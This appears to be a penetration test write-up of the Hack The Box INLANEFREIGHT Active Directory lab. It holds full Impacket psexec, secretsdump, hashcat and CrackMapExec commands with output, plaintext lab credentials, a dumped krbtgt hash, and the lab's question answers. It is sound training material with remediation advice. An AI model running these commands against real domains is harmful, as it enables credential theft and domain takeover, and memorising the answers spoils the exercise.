I went back through the assessment evidence available from this session, including the command outputs, BloodHound data, the `secretsdump` results, the `svc_reporting` enumeration, the finding structure, and the Q1–Q4 work. I’ve kept unsupported details explicitly marked rather than inventing evidence.

# INLANEFREIGHT Penetration Test

## Comprehensive CPTS-Style Technical Assessment Report

**Assessment Type:** Internal Active Directory / Network Penetration Test  
**Environment:** Hack The Box Academy — INLANEFREIGHT  
**Domain:** `INLANEFREIGHT.LOCAL`  
**Primary Domain Controller:** `172.16.5.5`  
**Assessment Network:** `172.16.5.0/24`  
**Primary Assessment Host:** Parrot Security OS  
**Testing Tools:** Impacket, CrackMapExec, `net rpc`, `rpcclient`, LDAP utilities, Hashcat, BloodHound, Neo4j  
**Report Classification:** Lab / Training Environment — Contains Credential Material

---

# 1. Executive Summary

The assessment of the `INLANEFREIGHT.LOCAL` environment demonstrated multiple weaknesses across Active Directory, credential management, authentication, network services, and endpoint configuration.

The most significant demonstrated attack path involved a privileged service account named `solarwindsmonitor`. The account was associated with an Active Directory service principal name and was identified as a member of **Domain Admins**. Valid credentials were subsequently used with Impacket's `psexec.py` against `172.16.5.5`, resulting in an interactive shell running as:

```text
NT AUTHORITY\SYSTEM
```

The resulting privileged access permitted extraction of local and domain credential material using `secretsdump.py`. The domain credential database contained the `krbtgt` account hash as well as the NTLM hash belonging to `svc_reporting`.

The `svc_reporting` NTLM hash was subsequently cracked offline using Hashcat, recovering the password:

```text
Reporter1!
```

The account was then authenticated against the domain controller and further enumerated. LDAP enumeration ultimately confirmed that `svc_reporting` belongs to:

```text
Backup Operators
```

This was the final group identified for the assessment question. The account also authenticated successfully against `DEV01` over SMB, although direct WMI execution was denied.

The assessment therefore demonstrated a chain involving:

```text
Active Directory Enumeration
        ↓
Privileged SPN / Service Account Discovery
        ↓
Domain Admin Credential
        ↓
SMB / PsExec
        ↓
NT AUTHORITY\SYSTEM
        ↓
NTDS Credential Extraction
        ↓
svc_reporting NTLM Hash
        ↓
Offline Password Cracking
        ↓
svc_reporting / Reporter1!
        ↓
Active Directory Enumeration
        ↓
Backup Operators Membership
```

---

# 2. Scope and Environment

## 2.1 Domain

```text
INLANEFREIGHT.LOCAL
```

The assessment artifacts contain extensive Active Directory enumeration data, including users, groups, computers, OUs, GPOs and domain objects. The BloodHound collection contained:

```text
20220602173557_computers.json
20220602173557_containers.json
20220602173557_domains.json
20220602173557_gpos.json
20220602173557_groups.json
20220602173557_ous.json
20220602173557_users.json
```

The evidence directory also contained separate AD enumeration data and a BloodHound collection ZIP.

## 2.2 Known Hosts

|IP|Host|Observed Information|
|---|---|---|
|`172.16.5.5`|Domain controller / AD server|LDAP, SMB, domain authentication|
|`172.16.5.200`|`DEV01`|Windows 10 Build 17763 x64|
|`172.16.5.130`|`FILE01`|Local administrator password reuse confirmed|

`DEV01` was identified as Windows 10.0 Build 17763 x64 and a member of `INLANEFREIGHT.LOCAL`.

---

# 3. Assessment Evidence Structure

The assessment was organized using the following structure:

```text
Inlanefreight Penetration Test
├── Admin
├── Deliverables
├── Evidence
│   ├── Findings
│   ├── Logging output
│   ├── Misc files
│   ├── Notes
│   ├── OSINT
│   ├── Scans
│   │   ├── AD Enumeration
│   │   ├── Service
│   │   ├── Vuln
│   │   └── Web
│   └── Wireless
└── Retest
```

The documented finding structure includes:

```text
H1 - Kerberoasting
H2 - ASREPRoasting
H3 - LLMNR&NBT-NS Response Spoofing
H4 - Tomcat Manager Weak Credentials
H5 - Local Admin Password Reuse
H6 - Password in Description Field
H7 - IPMI Hash Disclosure
H8 - Weak AD Passwords (Password Spraying)
H9 - Local File Inclusion
H10 - Command Injection
L1 - Directory Listing Enabled
M1 - Insecure File Shares
```

The assessment notes also contained dedicated sections for administrative information, scoping, activity logging, payload logging, OSINT, credentials, web application research, vulnerability research, service enumeration, AD enumeration, attack path and findings.

---

# 4. Tooling

The assessment used or attempted to use:

- Impacket
    
    - `GetADUsers.py`
        
    - `GetUserSPNs.py`
        
    - `psexec.py`
        
    - `secretsdump.py`
        
    - `wmiexec.py`
        
- CrackMapExec
    
- `net rpc`
    
- `rpcclient`
    
- `ldapsearch`
    
- Hashcat
    
- BloodHound
    
- Neo4j
    
- `grep`
    
- `curl`
    
- FreeRDP
    
- Obsidian for evidence/documentation
    

The installed Impacket version observed during the assessment was:

```text
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a
```

---

# 5. Initial Active Directory Enumeration

A credentialed domain enumeration was performed using the `solarwindsmonitor` account.

`GetADUsers.py` successfully queried the domain controller and returned domain users and associated password/last-logon information.

The environment contained privileged accounts including:

```text
administrator
lab_adm
krbtgt
```

as well as numerous standard and service accounts.

The presence of service accounts was particularly important because service accounts were subsequently found to possess Service Principal Names.

---

# 6. Finding H1 — Kerberoasting

## Description

Kerberoasting targets domain accounts configured with Service Principal Names (SPNs). The assessment identified multiple SPN-enabled accounts.

The BloodHound dataset confirms SPN-enabled service accounts, including `SQLPROD`, whose SPN was:

```text
MSSQLSvc/SPSJDB.inlanefreight.local:1433
```

and `SQLDEV`, whose SPN was:

```text
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

The SQLDEV account was marked as an administrative/high-value account in the BloodHound data.

The `solarwindsmonitor` account was also represented in BloodHound with:

```text
SPN: sts/inlanefreight.local
```

and administrative characteristics.

The assessment's `GetUserSPNs.py` enumeration identified the following accounts:

```text
solarwindsmonitor
sqlprod
sqldev
svc_vmwaresso
SAPService
```

Notably:

```text
solarwindsmonitor -> Domain Admins
sqldev            -> Domain Admins
sqlprod           -> Dev Accounts
```

This creates a significant Kerberos credential exposure because SPN-associated accounts can be targeted for service-ticket extraction and offline password cracking.

## Evidence

Example command:

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 \
INLANEFREIGHT.LOCAL/dhawkins
```

Observed SPNs included:

```text
sts/inlanefreight.local
MSSQLSvc/SPSJDB.inlanefreight.local:1433
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
vmware/inlanefreight.local
SAPService/srv01.inlanefreight.local
```

## Impact

A compromised service account can provide:

- Authentication to additional systems
    
- Access to services such as MSSQL
    
- Local administrative privileges
    
- Potential privilege escalation
    
- Potential Domain Admin-level access when the SPN account is privileged
    

## Recommendation

- Use Group Managed Service Accounts where possible.
    
- Avoid assigning Domain Admin privileges to service accounts.
    
- Use long, randomly generated service-account passwords.
    
- Rotate legacy service-account credentials.
    
- Audit all SPNs periodically.
    
- Remove unnecessary SPNs.
    
- Apply least privilege to service accounts.
    

---

# 7. Privileged Service Account — solarwindsmonitor

The `solarwindsmonitor` account was particularly important.

BloodHound data identified:

```text
Name:
SOLARWINDSMONITOR@INLANEFREIGHT.LOCAL

SPN:
sts/inlanefreight.local

admincount:
true
```

The BloodHound object also contained a password-like value in the account description:

```text
*** DO NOT CHANGE ***  8/3/2014: S0lar:S0lar14!
```

This demonstrates the password-in-description issue documented as H6.

The password actually used successfully during the demonstrated PsExec attack was:

```text
Solar1010
```

---

# 8. Q1 — Domain Administrator / SYSTEM Access

The discovered privileged credentials were used against the domain controller.

Command:

```bash
psexec.py \
'INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5'
```

PsExec found a writable `ADMIN$` share, uploaded an executable, created a temporary service and started it.

The resulting shell was:

```text
C:\Windows\system32>whoami
nt authority\system
```

This demonstrated complete operating-system-level compromise of the target host.

The Administrator desktop flag was then retrieved:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

Result:

```text
d0c_pwN_r3p0rt_reP3at!
```

### Q1 Answer

```text
d0c_pwN_r3p0rt_reP3at!
```

---

# 9. Post-Exploitation — secretsdump

With SYSTEM/Domain Admin-level access established, `secretsdump.py` was executed.

Command:

```bash
secretsdump.py \
'INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5'
```

The tool:

1. Started RemoteRegistry.
    
2. Retrieved the system boot key.
    
3. Extracted local SAM hashes.
    
4. Retrieved LSA secrets.
    
5. Used DRSUAPI to obtain domain credential material.
    

The evidence confirms the use of DRSUAPI to retrieve NTDS.DIT secrets.

---

# 10. Q2 — krbtgt NTLM Hash

The NTDS output contained:

```text
krbtgt:502:
aad3b435b51404eeaad3b435b51404ee:
16e26ba33e455a8c338142af8d89ffbc:::
```

Therefore the `krbtgt` NTLM hash was:

```text
16e26ba33e455a8c338142af8d89ffbc
```

### Q2 Answer

```text
16e26ba33e455a8c338142af8d89ffbc
```

The importance of the `krbtgt` credential is that it represents the Kerberos Key Distribution Center account and compromise of its secret material has severe implications for domain trust and Kerberos authentication.

---

# 11. svc_reporting Credential Discovery

The `secretsdump` output contained:

```text
svc_reporting:7608:
aad3b435b51404eeaad3b435b51404ee:
a6d3701ae426329951cf5214b7531140:::
```

The same account also had AES keys and DES material recorded in the dump.

The important NTLM hash was:

```text
a6d3701ae426329951cf5214b7531140
```

---

# 12. Offline Password Cracking

The NTLM hash was extracted into a Hashcat input file and attacked using the RockYou wordlist.

Command:

```bash
hashcat -m 1000 svc_reporting.hash \
/usr/share/wordlists/rockyou.txt
```

Hashcat identified the hash as:

```text
Hash.Mode: 1000 (NTLM)
```

and successfully recovered:

```text
a6d3701ae426329951cf5214b7531140:Reporter1!
```

The recovered password was therefore:

```text
Reporter1!
```

---

# 13. Q3 — svc_reporting Password

### Q3 Answer

```text
Reporter1!
```

The recovered credentials were subsequently validated against the domain.

---

# 14. svc_reporting Domain Enumeration

Command:

```bash
net rpc user info svc_reporting \
-U 'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
-S 172.16.5.5
```

Result:

```text
Domain Users
```

This output initially appeared to suggest that `svc_reporting` was only a normal Domain Users member.

However, this was incomplete because the assessment later identified membership in a powerful built-in group through LDAP.

---

# 15. Domain Group Enumeration

Using:

```bash
rpcclient \
-U 'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
172.16.5.5
```

the `enumdomgroups` command returned a large number of domain groups.

Important groups observed included:

```text
Domain Admins
Domain Users
Enterprise Admins
Schema Admins
Protected Users
Key Admins
Local Admins
Service Accounts
Tier 1 Admins
Tier 2 Admins
Tier 3 Admins
Tier 4 Admins
SQL Admins
SQL Dev
SQL QA
SQL Servers
IT Security
Network Ops
Secadmins
Dev Accounts
```

---

# 16. Local Admin Group Enumeration

The following command was executed:

```bash
net rpc group members "Local Admins" \
-U 'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
-S 172.16.5.5
```

The group contained numerous domain accounts, including:

```text
INLANEFREIGHT\suitessay
INLANEFREIGHT\conelays
INLANEFREIGHT\scrutunarace
INLANEFREIGHT\monexte41
INLANEFREIGHT\diseld70
INLANEFREIGHT\poemoss
INLANEFREIGHT\ineyes
INLANEFREIGHT\annere
INLANEFREIGHT\suldy1937
INLANEFREIGHT\matimprod
INLANEFREIGHT\beadis
INLANEFREIGHT\whate1946
INLANEFREIGHT\knotlexcel1964
INLANEFREIGHT\parrived
INLANEFREIGHT\abless
INLANEFREIGHT\larneyes
INLANEFREIGHT\thimpiend
INLANEFREIGHT\formaid
```

This demonstrates broad delegation of local administrative privileges.

---

# 17. Finding H5 — Local Administrator Password Reuse

Password reuse was tested across the `172.16.5.0/24` subnet.

The observed test identified:

```text
172.16.5.130  FILE01
administrator:Welcome123!

172.16.5.200  DEV01
administrator:Welcome123!
```

Both systems accepted the same local Administrator password.

This represents local administrator password reuse across multiple systems.

## Impact

An attacker who compromises the local administrator credential on one endpoint can potentially move laterally to other systems using the same password.

## Recommendation

Implement:

- Windows LAPS / Windows LAPS-managed local administrator passwords.
    
- Unique passwords per endpoint.
    
- Regular credential rotation.
    
- Removal of unnecessary local administrator accounts.
    
- Monitoring for lateral SMB authentication.
    

---

# 18. DEV01 Authentication Testing

The recovered `svc_reporting` credentials were tested against `DEV01`.

Command:

```bash
crackmapexec smb 172.16.5.200 \
-d INLANEFREIGHT.LOCAL \
-u svc_reporting \
-p 'Reporter1!'
```

The target identified itself as:

```text
DEV01
Windows 10.0 Build 17763 x64
INLANEFREIGHT.LOCAL
SMB signing: False
SMBv1: False
```

Authentication succeeded:

```text
[+] INLANEFREIGHT.LOCAL\svc_reporting:Reporter1!
```

---

# 19. WMI Execution Attempt

The credentials were tested with:

```bash
wmiexec.py \
'INLANEFREIGHT.LOCAL/svc_reporting:Reporter1!@172.16.5.200'
```

Result:

```text
[*] SMBv3.0 dialect used
[-] rpc_s_access_denied
```

This is important evidence because authentication success does not automatically imply administrative privileges.

The account was valid on the host, but WMI execution was denied.

---

# 20. nxc Availability Issue

The Parrot system did not have `nxc` installed:

```text
$ nxc smb 172.16.5.5 ...
-bash: nxc: command not found
```

CrackMapExec was therefore used as an alternative where available.

This is an operational/tooling observation and not a vulnerability in the target.

---

# 21. CrackMapExec Syntax Error

An attempt was made to combine:

```text
-d INLANEFREIGHT.LOCAL
```

with:

```text
--local-auth
```

The tool correctly rejected the combination:

```text
crackmapexec smb: error:
argument --local-auth is not allowed with argument -d
```

The correct domain-authentication syntax was subsequently used without `--local-auth`.

---

# 22. Finding H6 — Password in Description Field

The BloodHound data exposed sensitive password-like information in the `solarwindsmonitor` account's description field.

The account object contained:

```text
description:
*** DO NOT CHANGE ***  8/3/2014: S0lar:S0lar14!
```

This demonstrates a serious credential-management weakness.

## Impact

Account descriptions are frequently readable by ordinary domain users. Storing reusable passwords or password hints there can expose credentials without requiring exploitation of a technical vulnerability.

## Recommendation

- Never store passwords in AD Description/Notes fields.
    
- Search existing accounts for password-like descriptions.
    
- Rotate exposed credentials.
    
- Implement centralized secrets management.
    
- Audit privileged/service accounts regularly.
    

---

# 23. Finding H2 — AS-REP Roasting

The assessment documentation identifies:

```text
H2 - ASREPRoasting
```

and the assessment evidence contains an `ilfreight_asrep` directory associated with the technique.

AS-REP Roasting targets accounts configured without Kerberos pre-authentication.

The exact account/hash output for H2 was not present in the evidence retrieved for this report, so no specific username or cracked password is asserted here.

## Recommendation

Ensure privileged and service accounts require Kerberos pre-authentication unless there is a documented exception.

---

# 24. Finding H3 — LLMNR/NBT-NS Response Spoofing

The assessment documentation identifies:

```text
H3 - LLMNR&NBT-NS Response Spoofing
```

LLMNR and NBT-NS are fallback name-resolution mechanisms that can allow an unauthorized system to respond to name-resolution requests.

The assessment methodology included this attack category.

The retrieved assessment material does not contain the complete captured NetNTLM evidence for H3, so the exact victim account and recovered hash are not reconstructed here.

## Recommendation

- Disable LLMNR where operationally possible.
    
- Disable NBT-NS where unnecessary.
    
- Require SMB signing.
    
- Monitor for anomalous name-resolution responses.
    
- Monitor for unexpected NTLM authentication to workstations.
    

---

# 25. Finding H4 — Tomcat Manager Weak Credentials

The assessment finding register identifies:

```text
H4 - Tomcat Manager Weak Credentials
```

The assessment included Tomcat Manager as a tested web-service area.

The retrieved evidence confirms the finding title but does not contain the complete target-specific credential validation output, so a target-specific username/password is not asserted as verified evidence in this report.

## Recommendation

- Disable Tomcat Manager when not required.
    
- Use strong, unique credentials.
    
- Restrict Manager access by source IP.
    
- Avoid default credentials.
    
- Use separate administrative credentials.
    
- Monitor deployment and Manager authentication activity.
    

---

# 26. Finding H7 — IPMI Hash Disclosure

The finding register identifies:

```text
H7 - IPMI Hash Disclosure
```

This finding indicates exposure of IPMI authentication material during the assessment.

The exact target-specific IPMI hash output was not available in the retrieved session evidence, so the hash itself is intentionally not reconstructed.

## Recommendation

- Restrict IPMI interfaces to dedicated management networks.
    
- Use strong unique IPMI credentials.
    
- Disable IPMI where unnecessary.
    
- Upgrade vulnerable BMC/IPMI firmware.
    
- Monitor IPMI authentication.
    
- Avoid exposing BMC services to user-accessible networks.
    

---

# 27. Finding H8 — Weak Active Directory Passwords / Password Spraying

The finding register identifies:

```text
H8 - Weak AD Passwords (Password Spraying)
```

The domain password policy evidence shows:

```text
Minimum password length: 8
Lockout threshold: 5
Lockout duration: 30 minutes
Password complexity: enabled
Maximum password age: Unlimited
```

The documented policy output also indicates password complexity was enabled.

Although complexity was enabled, the environment still contained credentials susceptible to recovery through common-password techniques, including the recovered:

```text
Reporter1!
```

This demonstrates that complexity requirements alone do not eliminate weak-password risk.

## Recommendation

- Increase minimum password length.
    
- Use banned-password lists.
    
- Enforce MFA for privileged accounts.
    
- Use managed service accounts.
    
- Monitor password spraying indicators.
    
- Implement smart lockout and risk-based authentication.
    
- Avoid predictable service-account passwords.
    

---

# 28. Finding H9 — Local File Inclusion

The finding register identifies:

```text
H9 - Local File Inclusion
```

The retrieved evidence confirms the finding category but does not contain the target-specific URL, vulnerable parameter, or successful file-read payload.

Therefore, those details are not invented in this report.

## Recommendation

- Avoid using user-controlled file paths.
    
- Implement strict allowlists for files.
    
- Canonicalize and validate paths.
    
- Prevent traversal sequences.
    
- Restrict application filesystem permissions.
    
- Run web applications with least privilege.
    

---

# 29. Finding H10 — Command Injection

The finding register identifies:

```text
H10 - Command Injection
```

The retrieved assessment evidence confirms the finding name but not the complete target-specific command-injection payload/output.

Therefore, no unsupported payload is attributed to the INLANEFREIGHT environment.

## Recommendation

- Never construct OS commands directly from user input.
    
- Use safe process APIs.
    
- Apply strict input validation.
    
- Use allowlists rather than blocklists.
    
- Run application services with minimal privileges.
    
- Monitor suspicious child processes.
    

---

# 30. Finding L1 — Directory Listing Enabled

The assessment finding register identifies:

```text
L1 - Directory Listing Enabled
```

Directory listing can expose:

- Application files
    
- Backup files
    
- Configuration files
    
- Source code
    
- Documentation
    
- Sensitive artifacts
    

The target-specific directory path was not preserved in the retrieved evidence.

## Recommendation

Disable directory indexing unless explicitly required.

---

# 31. Finding M1 — Insecure File Shares

The assessment finding register identifies:

```text
M1 - Insecure File Shares
```

The assessment also demonstrated writable administrative SMB access during the privileged PsExec attack:

```text
Found writable share ADMIN$
```

Administrative shares such as `ADMIN$` are normal Windows functionality, but unauthorized access to them becomes highly significant when a privileged credential is compromised.

## Recommendation

- Restrict SMB access using host-based firewall rules.
    
- Apply least privilege.
    
- Review share and NTFS ACLs.
    
- Remove unnecessary writable shares.
    
- Monitor administrative share access.
    
- Enable SMB signing where appropriate.
    

---

# 32. BloodHound Investigation

BloodHound was used to analyze the Active Directory relationship graph.

The assessment environment contained a complete BloodHound dataset with:

```text
users.json
groups.json
computers.json
domains.json
gpos.json
ous.json
containers.json
```

Neo4j was initially unavailable as a systemd service:

```text
Unit neo4j.service could not be found.
```

However:

```bash
which neo4j
```

returned:

```text
/usr/bin/neo4j
```

and:

```bash
neo4j --version
```

returned:

```text
neo4j 4.2.1
```

Neo4j was successfully started manually with:

```bash
sudo neo4j start
```

The service subsequently exposed:

```text
http://localhost:7474/
```

and:

```text
Bolt localhost:7687
```

The health check returned:

```text
HTTP/1.1 200 OK
```

BloodHound then successfully loaded the collected domain graph.

---

# 33. BloodHound svc_reporting Investigation

Searching BloodHound for:

```text
svc_reporting
```

did not return a node in the GUI.

This was investigated because the final assessment question required determining the powerful group associated with `svc_reporting`.

The BloodHound data itself was present and contained thousands of domain objects. The `users.json` file contained approximately 2,953 user objects according to the collection metadata.

The direct LDAP query ultimately provided the definitive membership result.

---

# 34. Definitive svc_reporting LDAP Enumeration

Command:

```bash
ldapsearch -x -H ldap://172.16.5.5 \
-D 'solarwindsmonitor@INLANEFREIGHT.LOCAL' \
-w 'Solar1010' \
-b 'DC=INLANEFREIGHT,DC=LOCAL' \
'(sAMAccountName=svc_reporting)' \
memberOf
```

The returned object was:

```text
dn: CN=svc_reporting,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

and the important membership was:

```text
memberOf:
CN=Backup Operators,
CN=Builtin,
DC=INLANEFREIGHT,
DC=LOCAL
```

The LDAP query completed successfully:

```text
result: 0 Success
numEntries: 1
```

Therefore this is the authoritative result used for the final question.

---

# 35. Q4 — Powerful Local Group

### Answer

```text
Backup Operators
```

This supersedes the earlier incomplete `net rpc user info` result of:

```text
Domain Users
```

The `net rpc` result showed the primary/common domain group but did not reveal the additional built-in group.

LDAP directly returned:

```text
Backup Operators
```

Therefore the correct final answer is:

```text
Backup Operators
```

---

# 36. Why Backup Operators Is Significant

The Backup Operators group is a privileged Windows built-in group.

Membership can provide backup/restore-related privileges that may allow access to files otherwise protected by normal filesystem ACLs, depending on the effective token and privileges.

In an Active Directory environment, improper assignment of Backup Operators can therefore create a path to sensitive credential material and potentially domain compromise.

This is particularly important because `svc_reporting` was recovered from NTDS credential material after compromise of a privileged account.

---

# 37. Confirmed Assessment Questions

|Question|Answer|Evidence|
|---|---|---|
|Q1|`d0c_pwN_r3p0rt_reP3at!`|SYSTEM shell on `172.16.5.5`|
|Q2|`16e26ba33e455a8c338142af8d89ffbc`|`krbtgt` NTLM hash|
|Q3|`Reporter1!`|Hashcat cracked `svc_reporting` NTLM|
|Q4|`Backup Operators`|LDAP `memberOf` enumeration|

---

# 38. Complete Attack Chain

## Phase 1 — Enumeration

```text
INLANEFREIGHT.LOCAL
        |
        +-- Domain Controller: 172.16.5.5
        |
        +-- Service Accounts
        |
        +-- SPNs
```

## Phase 2 — Privileged Service Account Discovery

SPNs were enumerated and accounts such as:

```text
solarwindsmonitor
sqlprod
sqldev
svc_vmwaresso
SAPService
```

were identified.

`solarwindsmonitor` was associated with privileged domain administration.

## Phase 3 — Privileged Access

Credentials:

```text
solarwindsmonitor:Solar1010
```

were used with:

```bash
psexec.py \
'INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5'
```

Result:

```text
NT AUTHORITY\SYSTEM
```

## Phase 4 — Credential Dumping

```bash
secretsdump.py \
'INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5'
```

returned domain credentials including:

```text
krbtgt
administrator
lab_adm
svc_reporting
```

## Phase 5 — svc_reporting Hash Recovery

```text
svc_reporting
RID: 7608
NTLM:
a6d3701ae426329951cf5214b7531140
```

## Phase 6 — Offline Cracking

```bash
hashcat -m 1000 svc_reporting.hash \
/usr/share/wordlists/rockyou.txt
```

Result:

```text
Reporter1!
```

## Phase 7 — Credential Validation

```text
INLANEFREIGHT.LOCAL\svc_reporting:Reporter1!
```

successfully authenticated to `DEV01` over SMB.

## Phase 8 — Privilege Enumeration

Normal RPC enumeration showed:

```text
Domain Users
```

but LDAP enumeration revealed:

```text
Backup Operators
```

## Final Position

```text
svc_reporting
      |
      +-- Domain Users
      |
      +-- Backup Operators
```

---

# 39. Important Failed / Partial Attempts

## 39.1 nxc unavailable

```text
nxc: command not found
```

Fallback:

```text
crackmapexec
```

was used.

## 39.2 rpcclient against DEV01

Attempt:

```bash
rpcclient -U \
'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
172.16.5.200
```

Result:

```text
NT_STATUS_CONNECTION_DISCONNECTED
```

## 39.3 WMI against DEV01

Attempt:

```bash
wmiexec.py \
'INLANEFREIGHT.LOCAL/svc_reporting:Reporter1!@172.16.5.200'
```

Result:

```text
rpc_s_access_denied
```

This demonstrated that valid credentials did not automatically provide WMI administrative execution.

## 39.4 CrackMapExec option conflict

Incorrect combination:

```text
-d INLANEFREIGHT.LOCAL
--local-auth
```

Result:

```text
argument --local-auth is not allowed with argument -d
```

The correct domain authentication syntax was subsequently used.

## 39.5 BloodHound initial database issue

BloodHound initially displayed:

```text
No database found
```

Neo4j was not registered as a systemd service, but the binary was installed.

Manual startup succeeded:

```bash
sudo neo4j start
```

The database then became accessible over:

```text
localhost:7474
localhost:7687
```

---

# 40. Credential and Secret Inventory

## Domain Credentials Identified

|Account|Credential Material|Source|
|---|---|---|
|`solarwindsmonitor`|`Solar1010`|Successful PsExec|
|`svc_reporting`|`Reporter1!`|NTLM cracking|
|`krbtgt`|`16e26ba33e455a8c338142af8d89ffbc`|NTDS dump|

## Additional Credential Material

The NTDS dump also contained numerous other domain hashes, including:

```text
administrator
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
...
svc_vmwaresso
SAPService
asmith
svc_reporting
netmonitor
```

The retrieved evidence confirms that NTDS credential extraction exposed a large set of domain credential material.

---

# 41. Security Impact Summary

The assessment demonstrated the following major security conditions:

1. Privileged service account exposure.
    
2. SPN-enabled privileged accounts.
    
3. Domain Admin credentials usable for remote service execution.
    
4. SYSTEM-level compromise of the domain controller.
    
5. NTDS credential extraction.
    
6. Exposure of the `krbtgt` secret.
    
7. Recoverable NTLM password for `svc_reporting`.
    
8. Weak/recoverable service-account password.
    
9. Sensitive password information stored in an AD Description field.
    
10. Local administrator password reuse.
    
11. Broad local administrator group membership.
    
12. Valid domain credentials usable against multiple hosts.
    
13. Backup Operators membership for a service account.
    
14. SMB administrative share exposure.
    
15. Weak AD password conditions.
    
16. LLMNR/NBT-NS spoofing identified as a finding.
    
17. Tomcat Manager weak credentials identified as a finding.
    
18. IPMI hash disclosure identified as a finding.
    
19. Local File Inclusion identified as a finding.
    
20. Command Injection identified as a finding.
    
21. Directory Listing identified as a finding.
    
22. Insecure File Shares identified as a finding.
    

---

# 42. Remediation Priorities

## Priority 1 — Rotate Compromised Credentials

Immediately rotate:

```text
solarwindsmonitor
svc_reporting
krbtgt
```

and any other accounts whose NTLM material was exposed.

For `krbtgt`, perform the appropriate controlled Kerberos key rotation procedure rather than treating it like an ordinary user password.

---

## Priority 2 — Remove Privileged Service Accounts from Domain Admins

Service accounts such as `solarwindsmonitor` and `sqldev` should not have unnecessary Domain Admin membership.

Use:

- Group Managed Service Accounts
    
- Dedicated service identities
    
- Least privilege
    
- Restricted delegation
    
- Strong random passwords
    

---

## Priority 3 — Eliminate Passwords in AD Descriptions

Remove all passwords, password hints and reusable secrets from:

```text
Description
Notes
Info
Comment
Other non-secret AD attributes
```

The `solarwindsmonitor` description demonstrated exactly why this is necessary.

---

## Priority 4 — Deploy Windows LAPS

Local administrator password reuse should be eliminated.

Use Windows LAPS to generate and rotate unique local administrator passwords per machine.

---

## Priority 5 — Review Backup Operators

Review every member of:

```text
Backup Operators
```

especially service accounts.

`svc_reporting` should be reviewed to determine why it requires backup privileges.

---

## Priority 6 — Harden Kerberos

Review all SPNs and service accounts.

Recommended controls:

- Strong random service-account passwords.
    
- gMSA where possible.
    
- Remove unnecessary SPNs.
    
- Remove unnecessary privileged group membership.
    
- Monitor unusual TGS requests.
    

---

## Priority 7 — Disable Legacy Name Resolution

Where operationally possible:

```text
Disable LLMNR
Disable NBT-NS
```

and monitor NTLM authentication.

---

## Priority 8 — Harden SMB

- Enable SMB signing.
    
- Restrict SMB to required hosts.
    
- Review administrative share access.
    
- Review NTFS and share permissions.
    
- Monitor abnormal SMB lateral movement.
    

---

## Priority 9 — Improve Password Policy

The observed policy contained:

```text
Minimum length: 8
Lockout threshold: 5
Lockout duration: 30 minutes
Maximum password age: Unlimited
Complexity: Enabled
```

Recommended improvements include:

- Longer minimum passwords.
    
- Banned-password protection.
    
- MFA for privileged users.
    
- Managed service credentials.
    
- Risk-based authentication.
    
- Password spraying detection.
    

---

# 43. Evidence Command Reference

## Domain User Enumeration

```bash
GetADUsers.py -all \
INLANEFREIGHT.LOCAL/solarwindsmonitor:'Solar1010' \
-dc-ip 172.16.5.5
```

## SPN Enumeration

```bash
GetUserSPNs.py \
-dc-ip 172.16.5.5 \
INLANEFREIGHT.LOCAL/dhawkins
```

## Domain Group Enumeration

```bash
rpcclient \
-U 'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
172.16.5.5
```

Then:

```text
enumdomgroups
```

## Local Admin Group Enumeration

```bash
net rpc group members "Local Admins" \
-U 'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
-S 172.16.5.5
```

## User Group Enumeration

```bash
net rpc user info svc_reporting \
-U 'INLANEFREIGHT.LOCAL\svc_reporting%Reporter1!' \
-S 172.16.5.5
```

## LDAP Membership Enumeration

```bash
ldapsearch -x -H ldap://172.16.5.5 \
-D 'solarwindsmonitor@INLANEFREIGHT.LOCAL' \
-w 'Solar1010' \
-b 'DC=INLANEFREIGHT,DC=LOCAL' \
'(sAMAccountName=svc_reporting)' \
memberOf
```

Result:

```text
memberOf:
CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
```

## PsExec

```bash
psexec.py \
'INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5'
```

## Credential Dumping

```bash
secretsdump.py \
'INLANEFREIGHT.LOCAL/solarwindsmonitor:Solar1010@172.16.5.5'
```

## Extract svc_reporting Hash

```bash
grep -i "svc_reporting" secretsdump.txt
```

Result:

```text
svc_reporting:7608:
aad3b435b51404eeaad3b435b51404ee:
a6d3701ae426329951cf5214b7531140:::
```

## Crack NTLM

```bash
hashcat -m 1000 svc_reporting.hash \
/usr/share/wordlists/rockyou.txt
```

Recovered:

```text
Reporter1!
```

## SMB Authentication Test

```bash
crackmapexec smb 172.16.5.200 \
-d INLANEFREIGHT.LOCAL \
-u svc_reporting \
-p 'Reporter1!'
```

## WMI Test

```bash
wmiexec.py \
'INLANEFREIGHT.LOCAL/svc_reporting:Reporter1!@172.16.5.200'
```

---

# 44. Final Assessment Conclusion

The INLANEFREIGHT assessment demonstrated a significant compromise chain beginning with Active Directory/service-account enumeration and culminating in privileged operating-system access and extraction of domain credential material.

The most important demonstrated chain was:

```text
SPN / Service Account Discovery
              ↓
solarwindsmonitor
              ↓
Domain Admin privileges
              ↓
PsExec against 172.16.5.5
              ↓
NT AUTHORITY\SYSTEM
              ↓
secretsdump / NTDS extraction
              ↓
svc_reporting NTLM hash
              ↓
Hashcat
              ↓
Reporter1!
              ↓
Domain authentication
              ↓
LDAP enumeration
              ↓
Backup Operators
```

The assessment also identified local administrator password reuse, insecure credential storage in AD descriptions, weak password conditions, broad administrative group membership, and multiple web/network security findings.

The strongest remediation themes are:

1. **Eliminate unnecessary Domain Admin privileges.**
    
2. **Rotate all compromised credentials.**
    
